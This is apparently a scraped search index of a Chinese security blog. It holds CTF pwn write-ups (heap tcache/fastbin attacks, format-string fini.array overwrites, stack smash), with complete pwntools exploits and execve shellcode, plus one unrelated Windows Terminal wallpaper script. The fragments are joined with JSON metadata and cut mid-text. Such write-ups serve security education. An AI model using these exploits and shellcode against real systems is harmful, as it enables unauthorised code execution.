chunk 2的fd指向的地址是malloc_hook 利用tcache bin attack，分别往mmap分配的内存上写shellcode，把malloc_hook修改为mmap内存的地址 调用malloc的时候，触发shellcode，获取到shell EXP\r调试过程\r准备好函数和shellcode def Allocate(size:int) -\u003e int: sh.sendlineafter(\"\u003e\u003e \", \"1\") sh.sendlineafter(\"Size: \", str(size)) sh.recvuntil(\"Pointer Address \") msg = sh.recvline() log.info(\"{}\".format(msg)) return int16(msg[:-1].decode()) def Delete(idx:int): sh.sendlineafter(\"\u003e\u003e \", \"2\") sh.sendlineafter(\"Index: \", str(idx)) def Fill(idx:int, content:(bytes, str)): sh.sendlineafter(\"\u003e\u003e \", \"3\") sh.sendlineafter(\"Index: \", str(idx)) sh.sendafter(\"Content: \", content) shellcode = b\"\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05\" 获取到mmap申请内存的地址，分配5次内存，并释放chunk 0 sh.recvuntil(\"Mmap: \") msg = sh.recvline() mmap_addr = int16(msg[:-1].decode()) LOG_ADDR(\"mmap_addr\", mmap_addr) program_base_addr = Allocate(0x410) - 0x202068 # 0 LOG_ADDR(\"program_base_addr\", program_base_addr) Allocate(0x28) # 1 Allocate(0x18) # 2 Allocate(0x4f0) # 3 Allocate(0x10) # 4 # Delete(0) 编辑chunk 2，为unlink做准备 Fill(2, 0x10 * b'a' + p64(0x470)) 编辑前： 编辑后 触发unlink Delete(3) 释放chunk 1、2，并构造overlapped chunk Delete(1) Delete(2) Allocate(0x440) # 0 Allocate(0x510) # 1 利用tcache bin attack，分别写shellcode和更改malloc_hook内容 payload = b'a' * 0x410 + p64(0) + p64(0x31) + p64(mmap_addr + 0x10) Fill(0, payload + b'\\n') Allocate(0x28) # 2 Allocate(0x28) # 3 Fill(3, shellcode + b'\\n') Fill(1, '\\x30\\n') Allocate(0x18) # 5 Allocate(0x18) # 6 Fill(6, p64(mmap_addr + 0x10) + b'\\n') 修改前： 修改后： 调用malloc，触发shellcode sh.sendlineafter(\"\u003e\u003e \", \"1\") sh.sendlineafter(\"Size: \", str(16)) sh.interactive() 打远程效果如下： 完整exp\rfrom pwn import * sh:tube = process(\"./sctf_2019_easy_heap\") LOG_ADDR = lambda x, y: log.success('{} ===\u003e {}'.format(x, hex(y))) int16 = functools.partial(int, base=16) def Allocate(size:int) -\u003e int: sh.sendlineafter(\"\u003e\u003e \", \"1\") sh.sendlineafter(\"Size: \", str(size)) sh.recvuntil(\"Pointer Address \") msg = sh.recvline() log.info(\"{}\".format(msg)) return int16(msg[:-1].decode()) def Delete(idx:int): sh.sendlineafter(\"\u003e\u003e \", \"2\") sh.sendlineafter(\"Index: \", str(idx)) def Fill(idx:int, content:(bytes, str)): sh.sendlineafter(\"\u003e\u003e \", \"3\") sh.sendlineafter(\"Index: \", str(idx)) sh.sendafter(\"Content: \", content) shellcode = b\"\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05\" # sh.recvuntil(\"Mmap: \") msg = sh.recvline() mmap_addr = int16(msg[:-1].decode()) LOG_ADDR(\"mmap_addr\", mmap_addr) program_base_addr = Allocat","date":"2021-04-16","objectID":"/zh-cn/2021-04-16-sctf-2019-easy-heap/:0:0","tags":["pwn"],"title":"sctf_2019_easy_heap","uri":"/zh-cn/2021-04-16-sctf-2019-easy-heap/"},{"categories":["pwn-wp"],"content":"总结\r根据本题，学习与收获有： 当RELRO保护为NO RELRO的时候，init.array、fini.array、got.plt均可读可写；为PARTIAL RELRO的时候，ini.array、fini.array可读不可写，got.plt可读可写；为FULL RELRO时，init.array、fini.array、got.plt均可读不可写。 程序在加载的时候，会依次调用init.array数组中的每一个函数指针，在结束的时候，依次调用fini.array中的每一个函数指针 当程序出现格式化字符串漏洞，但是需要写两次才能完成攻击，这个时候可以考虑改写fini.array中的函数指针为main函数地址，可以再执行一次main函数。一般来说，这个数组的长度为1，也就是说只能写一个地址。 题目分析\rChecksec\r函数分析\rMain\r程序比较简单，只有一个main函数，而且就是格式化字符串漏洞。同时注意到，程序中有一个sys函数，里面调用了system。 Sys\r漏洞点\r漏洞点很明显，就是main函数中的格式化字符串漏洞。可以并且格式化参数是一个栈变量而不是堆变量，相对来说利用难度要低一点。并且程序给了system函数，其实都不需要泄露地址。 利用思路\r知识点\r程序在结束的时候会调用fini.array函数指针数组中的每一个回调函数。 利用过程\r利用格式化字符串漏洞，将fini.array[0]改写为main函数地址，与此同时，将printf@got改写为system@plt，获得第二次执行main函数的机会 输入/bin/sh获取shell EXP\r调试过程\r测出printf格式化字符串的偏移 输入：aaaa%x,%x,%x,%x,%x,%x,%x,%x,%x,%x 测量出偏移为4 第一次改写fini.array和printf@got，直接手撸： payload = b\"%2052c%13$hn%31692c%14$hn%356c%15$hn\"+ p32(0x804989c + 2) + p32(0x804989c) + p32(0x804979c) sh.recvline() sh.sendline(payload) 改写前： 改写后： 第二次输入/bin/sh获取shell： 完整exp\rfrom pwn import * sh = process(\"./ciscn_2019_sw_1\") # 往fini.array[0]写main@text, printf@got写system@plt payload = b\"%2052c%13$hn%31692c%14$hn%356c%15$hn\" + p32(0x804989c + 2) + p32(0x804989c) + p32(0x804979c) sh.recvline() sh.sendline(payload) sleep(1) sh.sendline(\"/bin/sh\") sh.interactive() 远程攻击效果： ","date":"2021-04-14","objectID":"/zh-cn/2021-04-14-ciscn-2019-sw-1/:0:0","tags":["pwn"],"title":"ciscn_2019_sw_1","uri":"/zh-cn/2021-04-14-ciscn-2019-sw-1/"},{"categories":["tools"],"content":"脚本功能\r以幻灯片模式自动切换windows terminal的背景图片，可自定义包含图片的目录、切换频率等。 使用命令python change_tty_image.py --help查看使用帮助。 代码一共就162行，核心功能代码事实上可能只有不到50行，其他都是一些检查、日志等语句。感兴趣的可以download脚本，自行定制一些功能。 开发需求\r近期在折腾windows terminal，于我而言这款终端软件也基本完全替代xshell，特别是win 10内置了ssh, scp等命令，用起来非常舒服和流畅。再和wsl结合起来一起玩，简直爽到飞起。 windows terminal可以自定义主题样式，自定义背景图片。作为一个伪二次元爱好者，当然要把背景换成adroable的小姐姐！ 然而，每次终端只能设置一张图片，根本无法滿足敲命令的时候看不一样的二次元小姐姐的需求。联想到windows可以设定图片目录，并选择幻灯片模式动态切换桌面背景，于是去google一番，发现windows terminal的settings.json好像没有这个选项。查阅[官方文档](Windows Terminal Appearance Profile Settings | Microsoft Docs)如下： 要么给一个路径，要么就和桌面壁纸设置为一样。 所以，如果想要自动切换windows terminal的背景图片，有一个折中方案：把backgroundImage设置为desktopWallpaper，然后桌面背景搞成幻灯片模式，也就是下面这样子： 这样就能自动切换。 但是像我这样壁纸比较多的收藏家，正愁壁纸多得无处安放，怎么能把desktop和windows terminal设置成一样的背景呢？这多不合适！ 于是，我花了1个小时，用python写了一个简单的脚本，支持设置壁纸目录、更新频率、随机更新功能，每个固定时间就为windows terminal切换一张背景图片。 使用技术\r要实现这个功能其实很简单，不需要高大上的技术。整个开发需求主要包含两点： 定时任务 修改windows terminal的settings.json中的backgroundImage项，切换为指定目录下的图片路径，并进行轮循设置。 针对两点需求，实现手段分别为： 使用time.sleep()设置定时任务。这应该是简单的方式了，适合简单的定时任务触发。 使用IO操作，先读取指定目录的所有image路径，然后取一个路径出来，替换掉backgroundImage的值即可。 实现起来很简单，也顺便帮我复习了一下python操作文件和目录的一些接口。 time模块获取时间，方便记录日志 random模块获取随机数，得到随机图片，显然，此处无需使用安全随机数生成器 os.walk()遍历所有目录下所有的图片路径 设置临时文件，读配置的时候，边读边写，然后可以使用re模块，正则匹配含有backgroundImage的行，替换掉路径 线程休眠实现定时任务 操作说明\rpython change_tty_image.py -h查看帮助 确保settings.json中已经预定义了一个路径 每次开始任务之前会备份一份配置文件，不用担心原有配置丢失 更新频率至少为10 min，太快了不就走马观花 建议使用pythonw后台运行脚本 使用示例\r查看帮助\r输入参数使用\r关键操作都会记录日志，或在屏幕输出！ 脚本详情\r# -*- encoding: utf-8 -*- ''' @File : change_tty_image.py @Time : 2021/04/08 21:00:20 @Author : Roderick Chan @Email : ch22166@163.com @Desc : Change windows-terminal background image automatically ''' import os import sys import functools import random import re import time # key word to set image key_word = \"\\\"backgroundImage\\\"\" # help message help_msg = \"\"\" Usage: python change_tty_image.py [settings_path] [picture_directory] [update_frequency] [random] Function: Change windows-terminal background image automatically. Note: settings_path: [required] The absolute path of windows-terminal setting file. picture_directory: [required] A absolute directory path fulled with pictures, only support 'png', 'jpg', 'gif'. update_frequency: [required] The frequency to update image, should be more than 10, default value is 30, which represents 30min. random: [optional] Select image randomly or not. Default value: False. Tips: 1. Use `python` to run this script and output log-info on the screen. 2. Use `pythonw` to run this script in the background and output nothing, but your can use 'tasklist' and 'taskkill' to stop. 3. recommendation command: pythonw change_tty_image.py [settings_path] [picture_directory] [update_frequency] [random] \u003e change_image.log 4. Use `python change_tty_image.py -h` to get help. \"\"\" def get_time(): return time.strftime(\"%Y-%m-%d %H:%M:%S\", time.localtime()) def log(msg): print(\"\\033[1;32mINFO\\033[0m: {} \\033[1;34mTime\\033[0m: {}\\n\".format(msg, get_time())) # parse args # check args args = sys.argv arg_len = len(args) # show help if len(args) \u003e 1 and (args[1] == \"-h\" or args[1] == \"--help\"): print(help_msg) sys.exit(0) if arg_len \u003c 4 or arg_len \u003e 5: print(\"\\033[1;31m[-] Args Error!\\033[0m\\n\") print(help_msg) sys.exit(-1) # validate args settings_path = args[1] picture_directory = args[2] update_frequency = args[3] random_enabled = False if arg_len == 5: random_enabled = bool(args[4]) assert os.path.exists(settings_path), \"settings_path doesn't exist.\" assert os.path.isfile(settings_path), \"settings_path is not a file path.\" assert os.path.exists(picture_directory), \"picture_directory doesn't exist.\" assert os.path.isdir(picture_directory), \"picture_directory is not a dir path.\" # process settings_path settings_dir, settings_full_name = os.path.split(settings_path) settings_name, setting_suffix = os.path.splitext(settings_full_name) backup_setting_path = os.path.join(settings_dir, settings_name + \"_backup\" + setting_suffix) tmp_setting_path = os.path.join(settings_dir, settings_name + \"_tmp","date":"2021-04-10","objectID":"/zh-cn/2021-04-10-%E5%B9%BB%E7%81%AF%E7%89%87%E6%94%BE%E6%98%A0%E6%A8%A1%E5%BC%8F%E5%88%87%E6%8D%A2windows-terminal%E8%83%8C%E6%99%AF%E5%9B%BE%E7%89%87/:0:0","tags":["windows terminal"],"title":"幻灯片放映模式切换windows terminal背景图片","uri":"/zh-cn/2021-04-10-%E5%B9%BB%E7%81%AF%E7%89%87%E6%94%BE%E6%98%A0%E6%A8%A1%E5%BC%8F%E5%88%87%E6%8D%A2windows-terminal%E8%83%8C%E6%99%AF%E5%9B%BE%E7%89%87/"},{"categories":["pwn-wp"],"content":"总结\r根据本题，学习与收获有： 非栈上的格式化字符串漏洞与栈上格式化字符串不同，主要区别在于无法直接使用%XXc$XXp + addr，去往指定地址写入内容。一般需要借助地址链完成任意地址写操作。 常用的地址链有：rbp指针链、args参数链 如果利用rbp指针链进行攻击，注意最后退出函数的时候，需要把rbp指针链恢复为原始状态。 pwntools可以设置context.buffer_size，默认为0x1000，可以改大一点，避免printf参数为%34565c%6$p这种情况的时候，满屏的空白字符，影响下一次利用。还可以利用for循环结合sleep来确保每一次printf写数据的时候，把所有输出的字符都完全接收，避免得到非预期结果。 打远程的时候，需要利用sleep函数，给缓冲区刷新的时间。 题目分析\rChecksec\r函数分析\rMain\r非常简单的main函数，不需要过多分析 漏洞点\r漏洞点就是上方函数中的printf格式化字符串，但是需要注意，字符串变量buf不在栈上，而是在bss段上。没有办法直接填地址去写。需要借助地址链进行分批次写入。 可以在printf处打下断点，看下栈： 这道题没有声明过局部栈变量，所以没有办法利用ebp地址链，但是可以利用args参数链。就在下方0x7ffd21c29a48 利用思路\r利用过程\r详细步骤： 测出格式化字符串的偏移 在栈上寻找一下有用的信息，泄露出栈地址和libc地址，得到存有main函数结束后eip寄存器内容的栈地址以及libc基地址。 利用args参数链修改地址，指向存有main函数retaddr的栈地址。 循环利用printf把retaddr修改为one_gadget 输入66666666，结束运行main函数，获取shell EXP\r调试过程\r测试格式化字符串的偏移，输入：%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p 要泄露出栈地址，偏移为9，泄露出libc地址，偏移为24 然后泄露地址： sh.sendline(\"%9$p,%24$p\") msg = sh.recvline() stack_addr, libc_addr = msg[:-1].split(b',') stack_addr = int16(stack_addr.decode()) libc_addr = int16(libc_addr.decode()) LOG_ADDR('stack_addr', stack_addr) LOG_ADDR('libc_addr', libc_addr) stack_ret_addr = stack_addr - 0xe0 libc_base_addr = libc_addr - 0x3e7638 LOG_ADDR('stack_ret_addr', stack_ret_addr) LOG_ADDR('libc_base_addr', libc_base_addr) gadgets = [0x4f2c5, 0x4f322, 0x10a38c] one_gadget = libc_base_addr + gadgets[2] LOG_ADDR('one_gadget', one_gadget) 查看输出： 然后修改栈地址链： payload = \"%{}c%9$hn\".format((stack_ret_addr \u0026 0xffff)) sh.sendline(payload) sh.recv() payload = \"%{}c%35$hn\".format((one_gadget \u0026 0xffff)) + 'a' * 0x10 sh.sendline(payload) 修改过程中的部分截图如下： 最后获取到shell： 完整exp\rfrom pwn import * import functools LOG_ADDR = lambda x, y: log.success('{} ===\u003e {}'.format(x, hex(y))) int16 = functools.partial(int, base=16) context.update(arch='amd64', os='linux', endian='little') sh:tube = process('./npuctf_2020_level2') sh.sendline(\"%9$p,%24$p\") msg = sh.recvline() stack_addr, libc_addr = msg[:-1].split(b',') stack_addr = int16(stack_addr.decode()) libc_addr = int16(libc_addr.decode()) LOG_ADDR('stack_addr', stack_addr) LOG_ADDR('libc_addr', libc_addr) stack_ret_addr = stack_addr - 0xe0 libc_base_addr = libc_addr - 0x3e7638 LOG_ADDR('stack_ret_addr', stack_ret_addr) LOG_ADDR('libc_base_addr', libc_base_addr) gadgets = [0x4f2c5, 0x4f322, 0x10a38c] one_gadget = libc_base_addr + gadgets[0] LOG_ADDR('one_gadget', one_gadget) sleep(1) payload = \"%{}c%9$hn\".format((stack_ret_addr \u0026 0xffff)) sh.sendline(payload) sh.recv() for _ in range(2): sh.sendline('a' * 0x30) sh.recv() sleep(2) payload = \"%{}c%35$hn\".format((one_gadget \u0026 0xffff)) + 'a' * 0x10 sh.sendline(payload) sh.recv() sleep(2) for _ in range(2): sh.sendline('a' * 0x30) sh.recv() sleep(2) payload = \"%{}c%9$hhn\".format((stack_ret_addr \u0026 0xff) + 2) sh.sendline(payload) sh.recv() sleep(2) for _ in range(2): sh.sendline('a' * 0x30) sh.recv() sleep(2) payload = \"%{}c%35$hhn\".format(((one_gadget \u003e\u003e 16) \u0026 0xff)) + 'a' * 0x10 sh.sendline(payload) sh.recv() sleep(2) for _ in range(2): sh.sendline('a' * 0x30) sh.recv() sleep(2) sh.send(\"6\" * 8 + '\\x00' * 8) sleep(3) sh.sendline(\"cat flag\") sh.interactive() 远程攻击效果如图： ","date":"2021-04-09","objectID":"/zh-cn/2021-04-09-npuctf-2020-level2/:0:0","tags":["pwn"],"title":"npuctf_2020_level2","uri":"/zh-cn/2021-04-09-npuctf-2020-level2/"},{"categories":["pwn-wp"],"content":"总结\r本题与这篇文章或者这篇文章的思路是一模一样的，但是由于有个eidt功能，所以利用起来更方便。 主要思路是： 构造fastbin和unsorted bin的overlapped chunk 爆破1个字节，利用fastbin attack分配chunk到stdout结构体上方，泄露libc地址 利用fastbin attack分配到malloc_hook上方，利用realloc_hook调整栈帧，使用one_gadget去getshell 题目分析\rChecksec\r保护全开，libc使用2.23。 关键函数分析\rDelete_weapon\r有一个UAF漏洞，可以利用fastbin double free来构造出overlapped chunk。 利用思路\r利用步骤： 利用UAF漏洞构造出overlapped fastbin chunk，布局为A---\u003eB---\u003eA 踩chunk A的fd的低字节，申请chunk到B的上方 修改B的chunk size为0x91 构造fastbin chunk和unsorted chunk重合的堆布局 分配fake chunk到stdout结构体上方泄露libc地址，这里需要爆破1个字节 利用realloc_hook + malloc_hook + one_gadget获取shell EXP\r完整exp\rfrom pwn import * import functools LOG_ADDR = lambda x, y: log.success('{} ===\u003e {}'.format(x, hex(y))) int16 = functools.partial(int, base=16) context.update(arch='amd64', os='linux', endian='little') def create_weapon(size:int, idx:int, name, sh:tube): sh.sendlineafter(\"choice \u003e\u003e \\n\", '1') sh.sendlineafter(\"wlecome input your size of weapon: \", str(size)) sh.sendlineafter(\"input index: \", str(idx)) sh.sendafter(\"input your name:\\n\", name) def delete_weapon(idx, sh:tube): sh.sendlineafter(\"choice \u003e\u003e \\n\", '2') sh.sendlineafter(\"input idx :\", str(idx)) def rename_weapon(idx, name, sh:tube): sh.sendlineafter(\"choice \u003e\u003e \\n\", '3') sh.sendlineafter(\"input idx: \", str(idx)) sh.sendafter(\"new content:\\n\", name) def attack(malloc_hook_offset = 0x3c4b10, gadget = 0x4527a, realloc_offset = 0x84710, low_2th_byte=b'\\xe5', sh:tube=None): create_weapon(0x60, 0, p64(0x71) * 10 + p64(0) + p64(0x71), sh) create_weapon(0x60, 1, p64(0x71) * 12, sh) create_weapon(0x60, 2, p64(0x51) * 12, sh) delete_weapon(0, sh) delete_weapon(1, sh) delete_weapon(0, sh) create_weapon(0x60, 3, b'\\x50', sh) create_weapon(0x60, 3, b'\\x50', sh) create_weapon(0x60, 3, b'\\x50', sh) create_weapon(0x60, 4, 'a', sh) delete_weapon(1, sh) rename_weapon(4, p64(0x71) * 3 + p64(0x91), sh) delete_weapon(1, sh) rename_weapon(4, p64(0x71) * 3 + p64(0x71) + b'\\xdd' + low_2th_byte, sh) create_weapon(0x60, 3, b'\\x00', sh) create_weapon(0x60, 5, 0x33 * b'\\x00' + p64(0x0FBAD1887) + p64(0) * 3 + b'\\x58', sh) leak_libc_addr = u64(sh.recvn(8)) LOG_ADDR('leak_libc_addr', leak_libc_addr) libc_base_addr = leak_libc_addr - 0x3c56a3 LOG_ADDR('libc_base_addr', libc_base_addr) delete_weapon(1, sh) rename_weapon(4, p64(0x71) * 3 + p64(0x71) + p64(libc_base_addr + malloc_hook_offset - 0x23), sh) create_weapon(0x60, 3, 'a', sh) create_weapon(0x60, 3, 0xb * b'a' + p64(libc_base_addr + gadget) + p64(libc_base_addr + realloc_offset + 0xd), sh) sh.sendlineafter(\"choice \u003e\u003e \\n\", '1') sh.sendlineafter(\"wlecome input your size of weapon: \", str(64)) sh.sendlineafter(\"input index: \", str(0)) sh.sendline('id') sh.recvline_contains(b'uid', timeout=1) sh.interactive() if __name__ == '__main__': sh = None while True: try: sh = remote('node3.buuoj.cn', 25668) attack(realloc_offset=0x846c0, gadget=0x4526a, sh=sh) except: try: sh.close() except: pass 效果展示\r","date":"2021-04-09","objectID":"/zh-cn/2021-04-09-de1ctf-2019-weapon/:0:0","tags":["pwn"],"title":"de1ctf_2019_weapon","uri":"/zh-cn/2021-04-09-de1ctf-2019-weapon/"},{"categories":["pwn-wp"],"content":"Random\r总结\r根据本题，学习与收获有： 有时候IDA反编译出来的代码不一定准确，需要结合汇编代码进行分析 之前的__stack_chk_fail函数，如果把args[0]处的地址覆盖为存储flag的地址，那么检测到canary被修改的时候，就会把flag打印出来 题目分析\rChecksec\r保护全开 函数分析\r部分函数已重命名！ Main\r在main函数中，调用了初始化函数，还有prctl函数，以及读取用户输入，输出一段欢迎信息。 这里因为buf距离rsp为0x20，如果完全读满0x10个字符，很可能会泄露出栈地址。 Initial\r没啥好看的 Set_prctl\r可以用seccomp-tools检测一下 禁用了execve Vuln\r这个函数的处理流程为： 读取flag到栈变量buf中 打印出了buf的低1个字节的地址 读取一个正整数num 读取用户输入，向栈变量v4里面读取(char)(num \u0026 0x80)个字符 Get_num\r读取一个正整数 Read_input\r就是从stdin中读取输入，遇到\\x0a结束。 漏洞点\r漏洞点1：printf泄露出栈地址\r在main函数的分析中指出，如果输入name的时候，长度恰好为0x10个可打印字符，可能泄露出栈上的内容。可结合gdb调试看一下： 的确能泄露出栈地址！ 漏洞点2：任意大小往栈地址写内容\r刚开始看IDA的反编译结果，看了半天，没有找到新的漏洞。后来研究了一下汇编代码，结合gdb调试，发现在read_input中，传给这个函数的第二个参数，也就是rsi寄存器的内容。 首先分析一下汇编代码： dword_20204c就是num \u0026 0x80，接下来是一个movsxd指令，将32位寄存器进行符号扩展到64位寄存器。直接使用$rebase(0xC1F)断点打在read_input函数出，输入整数为0xffff： 此时的rsi寄存器存储的内容为0xffffffffffffff80，因此可以溢出写，大小基本不限！ 利用思路\r由于漏洞点只能泄露出栈地址，虽然有任意大小溢出漏洞，但是由于不知道程序的基地址，也不知道libc的基地址，所以无法使用ROP进行利用。但是考虑到程序本身读取了flag，且开启了canary保护，因此可以尝试利用stack smash打印出flag。 知识点\rstack smash 开启了canary保护的程序，如果发现canary被修改，就会执行 __stack_chk_fail 函数来打印 argv[0] 指针所指向的字符串，正常情况下，这个指针指向了程序名。argv在很高的栈地址。 如果可以不限制大小地进行栈溢出，可以修改argv[0]为指向flag的字符串地址，就能打印出flag。 利用过程\r利用步骤： 利用printf打印出栈地址，结合gift地址，得到存储flag栈地址 利用溢出漏洞，覆盖argv[0]为flag地址，利用__stack_chk_fail打印出flag EXP\r调试过程\r本地调试的时候，随便设置了一个flag文件： 首先需要读取出栈地址和计算出flag地址： io = process('./random') io.sendafter(\"tell me your name\\n\", 0x10 * 'a') msg = io.recvline() leak_stack_addr = u64(msg[-7:-1] + b'\\x00\\x00' ) LOG_ADDR('leak_stack_addr', leak_stack_addr) flag_addr = leak_stack_addr - 0x320 msg = io.recvline() buf_low_addr = int(msg[5 : -1].decode(), base=16) LOG_ADDR('buf_low_addr', buf_low_addr) LOG_ADDR('flag_addr', flag_addr) 接下来直接对栈进行溢出，触发stack smash： io.sendafter(\"leave something?\\n\", str(0xffff)) io.sendline(p64(flag_addr) * 0x200) io.interactive() 完整exp\rfrom pwn import * LOG_ADDR = lambda x, y: log.success(\"{} ===\u003e {}\".format(x, hex(y))) io = process('./random') io.sendafter(\"tell me your name\\n\", 0x10 * 'a') msg = io.recvline() leak_stack_addr = u64(msg[-7:-1] + b'\\x00\\x00' ) LOG_ADDR('leak_stack_addr', leak_stack_addr) flag_addr = leak_stack_addr - 0x320 msg = io.recvline() buf_low_addr = int(msg[5 : -1].decode(), base=16) LOG_ADDR('buf_low_addr', buf_low_addr) LOG_ADDR('flag_addr', flag_addr) io.sendafter(\"leave something?\\n\", str(0xffff)) io.sendline(p64(flag_addr) * 0x200) io.interactive() 最后远程打的flag为： 引用与参考\rstack smash: https://ctf-wiki.org/pwn/linux/stackoverflow/fancy-rop/#stack-smash ","date":"2021-04-06","objectID":"/zh-cn/2021-06-05-pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B%E4%BA%8C%E6%9C%9Fpwn-random/:0:0","tags":["pwn"],"title":"pwnhub公开赛二期PWN-random","uri":"/zh-cn/2021-06-05-pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B%E4%BA%8C%E6%9C%9Fpwn-random/"},{"categories":["pwn-wp"],"content":"总结\r根据本题，学习与收获有： stdout结构体上方和malloc_hook上方均能伪造大小为0x70的chunk。一个用来泄露libc地址，一个用来getshell。 当程序没有show功能的时候，可以利用fastbin attack，这时候，可伪造大小为0x70的fastbin chunk到stdout结构体的上方，将flag修改为0x0FBAD1887，将_IO_write_base的低字节修改一下，比如修改为0x58。 有时候，直接劫持malloc_hook为one_gadget可能无法滿足条件，这个时候，可以利用malloc_hook上方的realloc_hook，利用realloc函数开头的几个pop指令，来调整栈帧。这个时候，设置realloc_hook为one_gadget，malloc_hook为realloc函数地址加上一个偏移，这里的偏移可以慢慢调试，选取2、4、6、12等。 构造overlapped的chunk的时候，有时候并不一定需要完全改写整个fd指针的内容，可以根据偏移只改写部分低字节。 main_arena+88或者main_arena+96距离stdout上方的fake chunk地址很近，只需修改低2位的字节，低1位的字节，固定为\\xdd。 题目分析\rChecksec\r可以看到，保护全开。 函数分析\rMain\r同样的，函数我均已经重命名过了。方便做题。很典型的菜单题。 Menu\r选项很简单，只有添加和删除。 Add\r有几个点需要注意一下： 最多只能分配20次 每次分配用户指定大小的chunk前，会分配一个0x30大小的chunk A用来管理后面的chunk B 用户指定的大小不能超过0x70，也就是说，所有的为用户分配的chunk，范围都在fastbin A[0]写的是1，A[1]写的是chunk B的地址，A[2]开始，写的是messgae，且没有溢出。 Delete\r这里需要注意： 只释放了上面的Add函数中的chunk B， 没有释放有管理功能的chunk A，但是把A[0]写为了0。 释放后指针没有置空，存在uaf。 漏洞点\r题目很精炼，漏洞点也比较好找。就是在Delete函数中，存在的一个uaf漏洞。由于靶机的环境是ubuntu 16.04，使用的libc版本为libc-2.23.so，因此，很显然就想到了使用fastbin double free attack。 利用思路\r知识点\rfastbin对double free的检测，是有一定的缺陷的。不像后来的tcache bin的检测，会去检查整条链中是否存在一样的被释放的chunk，fastbin只会去检查上一个chunk与当前的要释放的chunk是不是一样的。 fastbin double free利用的过程为free A ----\u003e free B ----\u003e free A。这里的A、B的大小要一样。之后，分配第一次的时候，改写fd指针为指定地址，然后连续分配两次，第四次分配，就能到指定地址获取chunk。也就是说，这里需要分配4次，才能分配到fake chunk。 利用过程\r由于题目没有edit的功能，所以利用起来还是很麻烦的，需要反复地进行malloc与free。 整体的利用思路如下： 构造出A--\u003eB--\u003eA的overlapped的fastbin chunk，同时做好堆内容的填写，便于使用fake chunk 修改A的fd指针的低字节，分配到fake chunk C处，让这个chunk C能修改到chunk B的size域和fd域 修改chunk B的size域，使其大于等于0x90，保证释放后能被放在unsorted bin中去，且fd和bk指针被写入一个libc地址 修改上面chunk B的fd的低2个字节，分配到stdout结构体上方，这里需要爆破一下。 修改stdout的flag字段和write_base的低字节，获取到libc地址 利用fastbin double free分配到malloc_hook，利用realloc + one_gadget来get_shell 详细利用步骤： 分配两个0x70大小的chunk 0和chunk 1，并把内容填充为0x0000000000000071，方便后续伪造chunk 依次释放chunk 0---\u003e1---\u003e0，然后分配大小为0x70的chunk 2，修改fd的低字节为0x20，继续分配chunk 3、4 分配chunk 5，那么chunk 5就能改写chunk 0的size和fd域 先释放chunk 0，再释放chunk 5，然后分配chunk 6，修改chunk 0的size域为0x91 再释放chunk 0，这样就得到了一个unsorted bin，且把释放了的chunk 0的fd写为了一个堆地址 分配一个0x30大小的chunk 7，避免后续分配管理的chunk的时候，从unsorted bin里面切割。 再次释放chunk 6，分配chunk 8，修改chunk 0的size为0x71和fd的低2个字节，使其fd指向stdout结构体上方的那个fake chunk 分配到stdout上方的fake chunk，修改stdout结构体的flag和write_base，泄露出堆地址 利用double free分配到malloc_hook附近，结合realloc调整栈帧，利用one_gadget获取shell EXP\r调试过程\r这里展示本地调试的过程，手动输入需要爆破的那个字节大小。 首先准备好各个函数： def Add(sh:tube, size:int, name:(str, bytes), msg:(str, bytes)=8 * b'\\x00' + p64(0x71) + b'\\x00' * 7): assert size \u003e 0 and size \u003c= 0x70 sh.sendlineafter(\"Your choice : \", '1') sh.sendlineafter(\"size of the game's name: \\n\", str(size)) sh.sendafter(\"game's name:\\n\", name) sh.sendlineafter(\"game's message:\\n\", msg) return sh.recvline() def Delete(sh:tube, idx:int): sh.sendlineafter(\"Your choice : \", '2') sh.sendlineafter(\"game's index:\\n\", str(idx)) sh.recvline() 分配两个chunk并释放，构造overlapped chunk： Add(sh, 0x60, 14 * p64(0x71)) # 0 Add(sh, 0x60, 14 * p64(0x71)) # 1 Delete(sh, 0) Delete(sh, 1) Delete(sh, 0) 修改低字节为0x20： Add(sh, 0x60, '\\x20') # 2 修改chunk 0的size域为0x91，得到unsorted bin chunk，并构造出fastbin与unsorted bin重合的堆布局，准备好0x30大小的chunk，避免切割unsorted bin： Add(sh, 0x60, '\\x20') # 3 Add(sh, 0x60, '\\x20') # 4 Add(sh, 0x60, p64(0) + p64(0x71)) # 5 Delete(sh, 0) Delete(sh, 5) Add(sh, 0x60, p64(0) + p64(0x91)) # 6 Add(sh, 0x20, 'bbbb') # 7 Delete(sh, 0) 修改chunk 0的size为0x71，修改fd指针的低2个字节，释放掉好0x30大小的chunk： get = input('get low 2th byte (hex):') get = int16(get) get = get.to_bytes(1, 'big') Add(sh, 0x60, p64(0) + p64(0x71) + b'\\xdd' + get) # 8 Delete(sh, 7) Add(sh, 0x60, 'deadbeef') # 9 首先看要修改的那个fake chunk的地址： 可以顺便看一下stdout结构体： 这里我们输入0x75就能分配到这个fake chunk处。 分配到stdout结构体上方，泄露出libc地址： Delete(sh, 7) # 10 sh.sendlineafter(\"Your choice : \", '1') sh.sendlineafter(\"size of the game's name: \\n\", str(0x60)) sh.sendafter(\"game's name:\\n\", 0x33 * b'\\x00' + p64(0x0FBAD1887) + p64(0) * 3 + b'\\x58') leak_libc_addr = u64(sh.recvn(8)) sh.sendlineafter(\"game's message:\\n\", 'aaa') LOG_ADDR('leak_libc_addr', leak_libc_addr) libc_base_addr = leak_libc_addr - 0x3c56a3 LOG_ADDR('libc_base_","date":"2021-04-04","objectID":"/zh-cn/2021-04-04-ycb-2020-babypwn/:0:0","tags":["pwn"],"title":"ycb_2020_babypwn","uri":"/zh-cn/2021-04-04-ycb-2020-babypwn/"},{"categories":["pwn-wp"],"content":"总结\r根据本题，学习与收获有： house of force不需要保证top chunk的size域是合法的，但是house of orange需要保证size域合法，因为后一种利用方式会把top chunk放在unsorted bin，会有chunk size的检查。 house of force一般需要泄露出heap地址，并且需要能改写top 